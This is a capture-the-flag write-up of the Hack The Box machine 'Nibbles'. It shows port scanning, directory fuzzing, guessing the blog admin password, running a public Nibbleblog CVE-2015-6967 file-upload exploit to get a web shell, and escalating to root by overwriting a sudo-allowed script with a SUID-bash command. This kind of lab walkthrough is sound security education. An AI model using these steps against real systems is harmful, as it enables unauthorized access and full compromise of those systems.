---
layout: writeup
category: HTB
chall_description: https://app.hackthebox.com/machines/Nibbles
points: 0
solves: 28427
tags: Linux AuthenticatedFileUpload CVE-2015-6967
date: 2024-10-19
comments: true
---

<img src="/assets/images/htb/nibbles/icon.png" alt="" width="40%">

# Enumeration

First we will start an **nmap** scan:
```bash
# Nmap 7.94SVN scan initiated Fri Oct 18 22:56:41 2024 as: nmap -p- --open -sCVS -n -Pn -vvv -oN target nibbles.htb
Nmap scan report for nibbles.htb (10.129.239.44)
Host is up, received user-set (0.049s latency).
Scanned at 2024-10-18 22:56:41 CEST for 27s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 18 22:57:08 2024 -- 1 IP address (1 host up) scanned in 27.18 seconds
```
We will be able to see the following data:

| PORT | SERVICE                 |
| ---- | ----------------------- |
| 80   | **HTTP**: Apache 2.4.18 |
| 22   | **SSH**: OpenSSH 7.2p2  |

If we go to the web page we can see the following:

![](/assets/images/htb/nibbles/1.png)

If we look at the code of the page we can see the following comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

If we go to this directory we can find the following:

![](/assets/images/htb/nibbles/2.png)

We see it's like a blog, let's do a little fuzzing:
```bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://nibbles.htb/nibbleblog' -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nibbles.htb/nibbleblog
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2987]
/sitemap.php          (Status: 200) [Size: 402]
/content              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://nibbles.htb/nibbleblog/themes/]
/feed.php             (Status: 200) [Size: 302]
/admin                (Status: 301) [Size: 321] [--> http://nibbles.htb/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/plugins              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 325] [--> http://nibbles.htb/nibbleblog/languages/]
```

If we go to the **`README`** file we can see the following:

![](/assets/images/htb/nibbles/3.png)

We found the version of *Nibbleblog* the **v4.0.3**, if we search we can find the following:

- [https://github.com/dix0nym/CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967)

# Foothold
But we need valid credentials. If we go to **`admin.php`** we can see a login:

![](/assets/images/htb/nibbles/4.png)

If we try basic credentials like `admin:admin | admin:admin123` and nothing. If we try `admin` and the machine name `nibbles`:

![](/assets/images/htb/nibbles/5.png)

We are going to download the following exploit:

- [https://raw.githubusercontent.com/FredBrave/CVE-2015-6967/refs/heads/main/CVE-2015-6967.py](https://raw.githubusercontent.com/FredBrave/CVE-2015-6967/refs/heads/main/CVE-2015-6967.py)

```bash
❯ wget https://raw.githubusercontent.com/FredBrave/CVE-2015-6967/refs/heads/main/CVE-2015-6967.py
--2024-10-18 23:18:36--  https://raw.githubusercontent.com/FredBrave/CVE-2015-6967/refs/heads/main/CVE-2015-6967.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3430 (3,3K) [text/plain]
Saving to: ‘CVE-2015-6967.py’

CVE-2015-6967.py                               100%[==================================================================================================>]   3,35K  --.-KB/s    in 0s      

2024-10-18 23:18:36 (46,0 MB/s) - ‘CVE-2015-6967.py’ saved [3430/3430]
```

Let's run the exploit:
```bash
❯ python3 CVE-2015-6967.py --url http://nibbles.htb --username admin --password nibbles
[ + ] Login Succesfuly!
[+] Uploading shell...
[ * ] Shell has been uploaded!
---------------------------------------------------------------------------
cmd> whoami
nibbler
```

As I don't like this type of shell I will send me a normal reverse shell:

![](/assets/images/htb/nibbles/6.png)

Now if we go to the home of the user nibbler we can see the **user.txt**:

```bash
nibbler@Nibbles:/home/nibbler$ pwd
/home/nibbler
nibbler@Nibbles:/home/nibbler$ cat user.txt 
79c03865431*************
nibbler@Nibbles:/home/nibbler$
```

# Privilege Escalation

If we do an `ls` we will see a file called `personal.zip` and we will unzip it:

```bash
nibbler@Nibbles:/home/nibbler$ ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
```

we will be able to see a file called `monitor.sh`, if we do a `sudo -l` we will be able to see the following:

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

What we will do is to delete the `monitor.sh` file and create a new one with the same name where we give suid permissions to the bash, this will work thanks to the fact that later with the sudo permission we will be able to execute it as root:

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ rm -rf monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'chmod u+s /bin/bash' > monitor.sh 
```

Now we will run it as root:

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami
root
bash-4.3# 
```
